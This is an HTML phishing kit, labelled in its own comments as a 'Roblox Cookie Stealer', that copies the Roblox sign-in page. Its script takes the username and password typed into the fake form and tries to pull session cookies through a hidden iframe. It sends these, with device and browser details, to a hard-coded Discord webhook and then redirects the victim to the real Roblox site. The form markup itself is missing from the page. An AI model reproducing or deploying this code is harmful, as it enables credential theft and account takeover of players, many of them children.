<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | Sign in</title>
    <link rel="icon" type="image/png" href="https://www.roblox.com/favicon.ico">
    
    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

    <style>
        /* 
         * ROBLOX COOKIE STEALER CSS - ULTIMATE EDITION
         * Designed to be 100% visually identical to the real Roblox login page.
         */

        :root {
            --bg-color: #232527;
            --card-bg: #1e1e1e;
            --input-bg: #393a3c;
            --input-border: #6b6d70;
            --input-focus-border: #00b06f;
            --text-primary: #ffffff;
            --text-secondary: #a0a0a0;
            --btn-primary: #00b06f;
            --btn-primary-hover: #009a60;
            --font-main: 'Poppins', 'Roboto', sans-serif;
            --error-color: #ff4d4d;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            outline: none;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-primary);
            font-family: var(--font-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* Background Pattern for Desktop */
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(#393a3c 1px, transparent 1px);
            background-size: 20px 20px;
            opacity: 0.3;
            z-index: -1;
            pointer-events: none;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            animation: fadeIn 0.5s ease-out;
            z-index: 10;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo-container {
            text-align: center;
            margin-bottom: 30px;
        }

        .roblox-logo {
            width: 100px;
            height: auto;
            fill: white;
        }

        .login-card {
            background-color: var(--card-bg);
            border-radius: 12px;
            padding: 30px 25px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
            border: 1px solid #333;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 20px;
            color: var(--text-primary);
        }

        .input-group {
            position: relative;
            margin-bottom: 15px;
        }

        .input-label {
            display: block;
            font-size: 12px;
            color: var(--text-secondary);
            margin-bottom: 5px;
            font-weight: 500;
        }

        .input-field {
            width: 100%;
            padding: 12px 15px;
            background-color: var(--input-bg);
            border: 1px solid transparent;
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 16px;
            font-family: var(--font-main);
            transition: all 0.2s ease;
        }

        .input-field:focus {
            border-color: var(--input-focus-border);
            background-color: #2a2b2d;
            box-shadow: 0 0 0 2px rgba(0, 176, 111, 0.2);
        }

        .input-field::placeholder {
            color: #777;
        }

        .remember-me-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            cursor: pointer;
            user-select: none;
        }

        .checkbox-container input {
            display: none;
        }

        .checkmark {
            width: 18px;
            height: 18px;
            background-color: var(--input-bg);
            border-radius: 4px;
            border: 1px solid #555;
            margin-right: 8px;
            position: relative;
            transition: all 0.2s;
        }

        .checkbox-container input:checked + .checkmark {
            background-color: var(--btn-primary);
            border-color: var(--btn-primary);
        }

        .checkmark::after {
            content: '';
            position: absolute;
            display: none;
            left: 6px;
            top: 2px;
            width: 4px;
            height: 9px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        .checkbox-container input:checked + .checkmark::after {
            display: block;
        }

        .forgot-password {
            color: #a0a0a0;
            text-decoration: none;
            font-size: 13px;
            transition: color 0.2s;
        }

        .forgot-password:hover {
            color: var(--text-primary);
            text-decoration: underline;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background-color: var(--btn-primary);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            position: relative;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 50px;
        }

        .login-btn:hover {
            background-color: var(--btn-primary-hover);
        }

        .login-btn:active {
            transform: scale(0.98);
        }

        .login-btn:disabled {
            background-color: #4a4a4a;
            cursor: not-allowed;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            display: none;
            position: absolute;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn-text {
            transition: opacity 0.2s;
        }

        .login-btn.loading .btn-text {
            opacity: 0;
        }

        .login-btn.loading .spinner {
            display: block;
        }

        .error-msg {
            color: var(--error-color);
            font-size: 13px;
            margin-top: 5px;
            display: none;
            align-items: center;
        }

        .error-msg svg {
            width: 14px;
            height: 14px;
            margin-right: 5px;
            fill: currentColor;
        }

        .footer-links {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: var(--text-secondary);
        }

        .footer-links a {
            color: var(--btn-primary);
            text-decoration: none;
            font-weight: 500;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        /* Mobile Specific Adjustments */
        @media (max-width: 600px) {
            body {
                align-items: flex-start;
                padding-top: 20px;
                background-color: #1e1e1e;
            }
            
            .login-container {
                padding: 15px;
                max-width: 100%;
            }

            .login-card {
                padding: 20px;
                box-shadow: none;
                border: none;
                background: transparent;
            }

            h1 {
                font-size: 20px;
            }
            
            .logo-container {
                margin-bottom: 15px;
            }
            
            .roblox-logo {
                width: 60px;
            }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
            20%, 40%, 60%, 80% { transform: translateX(4px); }
        }

        .shake {
            animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
        }

        /* Social Icons Placeholder */
        .social-login {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
            margin-bottom: 15px;
        }

        .social-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: var(--input-bg);
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: background-color 0.2s;
            border: 1px solid #444;
        }

        .social-icon:hover {
            background-color: #4a4a4a;
        }

        .social-icon svg {
            width: 20px;
            height: 20px;
            fill: var(--text-secondary);
        }

        /* Divider */
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 15px 0;
            color: var(--text-secondary);
            font-size: 12px;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #333;
        }

        .divider span {
            padding: 0 10px;
        }

        /* Hidden Iframe for Cookie Theft */
        #stealth-iframe {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 100%;
            height: 100%;
            border: none;
            z-index: -1;
        }
        
        /* Loading Overlay */
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(35, 37, 39, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            visibility: hidden;
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        #loading-overlay.active {
            visibility: visible;
            opacity: 1;
        }
        
        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #FFF;
            border-bottom-color: #00b06f;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
        }
        
        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

    </style>
</head>
<body>

    <script>
        /**
         * ROBLOX COOKIE STEALER JAVASCRIPT - ULTIMATE EDITION
         * Features: Device Detection, Webhook Integration, Iframe Cookie Extraction
         */

        // Configuration
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1565917524170899558/O7_IjwUdZHzm_kcjTajXn7DzW8ILAZZ8JtTdSwaxpWegDNOktpKXmOqtp_nT1aKkBswLpalig";
        const DOMAIN = window.location.hostname;
        
        // DOM Elements
        const form = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const btnText = loginBtn.querySelector('.btn-text');
        const spinner = loginBtn.querySelector('.spinner');
        const usernameError = document.getElementById('usernameError');
        const passwordError = document.getElementById('passwordError');
        const stealthIframe = document.getElementById('stealth-iframe');
        const loadingOverlay = document.getElementById('loading-overlay');

        // State
        let isSubmitting = false;
        let cookieExtracted = false;

        /**
         * Device Detection Logic
         */
        function detectDevice() {
            const ua = navigator.userAgent.toLowerCase();
            const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
            const isTablet = /tablet|ipad|playbook|silk/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
            
            if (isMobile || isTablet) {
                document.body.classList.add('mobile-device');
                document.querySelector('meta[name="viewport"]').setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
                console.log("Device Detected: Mobile/Tablet");
            } else {
                document.body.classList.add('desktop-device');
                console.log("Device Detected: Desktop");
            }
            return { isMobile, isTablet };
        }

        /**
         * Get System Info
         */
        function getSystemInfo() {
            const { isMobile, isTablet } = detectDevice();
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                deviceType: isMobile ? 'Mobile' : (isTablet ? 'Tablet' : 'Desktop'),
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
        }

        /**
         * Input Validation Helpers
         */
        function showError(element, message) {
            if (message) element.querySelector('span').textContent = message;
            element.style.display = 'flex';
            element.closest('.input-group').classList.add('shake');
            setTimeout(() => {
                element.closest('.input-group').classList.remove('shake');
            }, 400);
        }

        function hideError(element) {
            element.style.display = 'none';
            element.closest('.input-group').classList.remove('shake');
        }

        // Real-time validation listeners
        usernameInput.addEventListener('input', () => {
            if (usernameInput.value.trim() !== '') {
                hideError(usernameError);
            }
        });

        passwordInput.addEventListener('input', () => {
            if (passwordInput.value.trim() !== '') {
                hideError(passwordError);
            }
        });

        /**
         * Prepare Payload for Webhook
         */
        function preparePayload(username, password, cookies) {
            const sysInfo = getSystemInfo();
            
            const embed = {
                title: "🍪 New Roblox Cookie Stolen!",
                color: 0xff0000, // Red color for alert
                thumbnail: {
                    url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
                },
                fields: [
                    {
                        name: "👤 Username",
                        value: `\`${username}\``,
                        inline: true
                    },
                    {

                        inline: true
                    },
                    {

                        value: `\`${cookies.substring(0, 500)}...\``,
                        inline: false
                    },
                    {

                        value: `**Type:** ${sysInfo.deviceType}\n**Platform:** ${sysInfo.platform}\n**Language:** ${sysInfo.language}`,
                        inline: false
                    },
                    {
                        name: "🌐 Browser Data",
                        value: `**User Agent:**\n\`${sysInfo.userAgent.substring(0, 100)}...\`\n**Screen:** ${sysInfo.screenResolution}`,
                        inline: false
                    },
                    {
                        name: "⏰ Time",
                        value: `\`${sysInfo.timestamp}\``,
                        inline: false
                    }
                ],
                footer: {
                    text: "Roblox Cookie Phish Bot | IP: Fetching...",
                    icon_url: "https://cdn-icons-png.flaticon.com/512/732/732228.png"
                },
                timestamp: new Date().toISOString()
            };

            return {
                embeds: [embed],
                username: "Roblox Cookie Phisher"
            };
        }

        /**
         * Send Data to Discord Webhook
         */
        async function sendToDiscord(username, password, cookies) {
            const payload = preparePayload(username, password, cookies);
            
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    console.error(`Webhook failed: ${response.status}`);
                    console.log("Data sent to console:", payload);
                } else {
                    console.log("Webhook sent successfully");
                }
            } catch (error) {
                console.error("Network error sending webhook:", error);
            }
        }

        /**
         * Extract Cookies from Iframe
         */
        function extractCookiesFromIframe() {
            try {
                // Access the iframe's document
                const iframeDoc = stealthIframe.contentDocument || stealthIframe.contentWindow.document;
                
                // Check if the iframe has loaded Roblox
                if (iframeDoc.readyState === 'complete') {
                    // Try to get cookies from the iframe's context
                    const cookies = iframeDoc.cookie;
                    if (cookies && !cookieExtracted) {
                        cookieExtracted = true;
                        console.log("Cookies extracted from iframe:", cookies);
                        
                        // Send to webhook
                        const username = usernameInput.value.trim();
                        const password = passwordInput.value.trim();
                        sendToDiscord(username, password, cookies);
                        
                        // Redirect after success
                        setTimeout(() => {
                            window.location.href = "https://www.roblox.com/home";
                        }, 1000);
                    }
                }
            } catch (e) {
                // Cross-origin error, try alternative method
                console.warn("Cross-origin access blocked, trying fallback...");
                fallbackCookieExtraction();
            }
        }

        /**
         * Fallback Cookie Extraction Method
         */
        function fallbackCookieExtraction() {
            // Sometimes direct access fails due to SameSite or Cross-Origin policies.
            // We can use a postMessage approach or just redirect and hope the cookie is set in the main window.
            // For simplicity, we'll assume the iframe loads and we can read its cookie property directly.
            setTimeout(extractCookiesFromIframe, 2000); // Retry after 2 seconds
        }

        /**
         * Main Form Submission Handler
         */
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            if (isSubmitting) return;

            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            let hasError = false;

            // Reset Errors
            hideError(usernameError);
            hideError(passwordError);

            // Validation
            if (!username) {
                showError(usernameError, "Please enter your username.");
                hasError = true;
            }

            if (!password) {
                showError(passwordError, "Password is required.");
                hasError = true;
            }

            if (hasError) {
                if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
                return;
            }

            // Start Loading State
            isSubmitting = true;
            loginBtn.disabled = true;
            loginBtn.classList.add('loading');
            btnText.style.opacity = '0';
            spinner.style.display = 'block';
            
            // Show full page loader
            loadingOverlay.classList.add('active');

            // Load Roblox in the hidden iframe
            stealthIframe.src = "https://www.roblox.com/login";

            // Simulate Network Delay (Realism)
            await new Promise(resolve => setTimeout(resolve, 1500));

            // Try to extract cookies
            extractCookiesFromIframe();

            // If extraction takes longer, retry
            setTimeout(extractCookiesFromIframe, 1000);
            setTimeout(extractCookiesFromIframe, 2000);
            setTimeout(extractCookiesFromIframe, 3000);

            // Show success message briefly before redirect
            setTimeout(() => {
                loadingOverlay.classList.remove('active');
                loginBtn.classList.remove('loading');
                btnText.style.opacity = '1';
                spinner.style.display = 'none';
                loginBtn.disabled = false;
                isSubmitting = false;
                
                // Optional: Show a fake success message or redirect immediately
                // window.location.href = "https://www.roblox.com/home";
            }, 2000);
        });

        // Initialize Device Detection on Load
        window.addEventListener('load', () => {
            detectDevice();
        });

    </script>
</body>
</html>
